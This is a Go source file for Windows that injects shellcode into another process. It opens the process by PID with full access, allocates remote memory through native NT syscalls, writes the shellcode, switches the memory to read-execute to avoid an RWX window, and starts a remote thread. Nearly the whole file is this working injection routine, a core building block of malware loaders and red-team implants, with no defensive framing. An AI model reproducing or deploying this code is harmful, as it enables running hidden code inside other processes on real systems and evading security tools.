//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// OBJECT_ATTRIBUTES and CLIENT_ID are required by NtOpenProcess.
type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type CLIENT_ID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

// injectRemote allocates RW memory in the process identified by hProc,
// copies sc into it, flips protection to RX, then spawns a new thread
// via NtCreateThreadEx. The function returns as soon as the thread is
// created — it does NOT wait for the shellcode to finish.
func injectRemote(hProc syscall.Handle, sc []byte) error {
	size := uintptr(len(sc))
	var remoteBase uintptr

	// Allocate RW in remote process
	r, _, _ := procNtAlloc.Call(
		uintptr(hProc),
		uintptr(unsafe.Pointer(&remoteBase)),
		0,
		uintptr(unsafe.Pointer(&size)),
		memCommit|memReserve,
		pageReadWrite,
	)
	if r != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory(remote): 0x%08x", r)
	}

	// Write shellcode into remote process
	r, _, _ = procNtWrite.Call(
		uintptr(hProc),
		remoteBase,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		0,
	)
	if r != 0 {
		return fmt.Errorf("NtWriteVirtualMemory: 0x%08x", r)
	}

	// Flip remote region to RX — no RWX window
	var old uint32
	r, _, _ = procNtProtect.Call(
		uintptr(hProc),
		uintptr(unsafe.Pointer(&remoteBase)),
		uintptr(unsafe.Pointer(&size)),
		pageExecuteRead,
		uintptr(unsafe.Pointer(&old)),
	)
	if r != 0 {
		return fmt.Errorf("NtProtectVirtualMemory(remote): 0x%08x", r)
	}

	// Create thread in remote process starting at remoteBase
	var thread uintptr
	r, _, _ = procNtCreateThread.Call(
		uintptr(unsafe.Pointer(&thread)),
		threadAllAccess,
		0,
		uintptr(hProc),
		remoteBase,
		0,
		0, 0, 0, 0, 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx(remote): 0x%08x", r)
	}

	return nil
}

// injectByPID opens the process with the given PID and calls injectRemote.
func injectByPID(pid uint32, sc []byte) error {
	var hProc uintptr
	var oa OBJECT_ATTRIBUTES
	oa.Length = uint32(unsafe.Sizeof(oa))
	var cid CLIENT_ID
	cid.UniqueProcess = uintptr(pid)

	r, _, _ := procNtOpen.Call(
		uintptr(unsafe.Pointer(&hProc)),
		processAllAccess,
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
	if r != 0 {
		return fmt.Errorf("NtOpenProcess(pid %d): 0x%08x", pid, r)
	}
	defer syscall.CloseHandle(syscall.Handle(hProc))

	return injectRemote(syscall.Handle(hProc), sc)
}
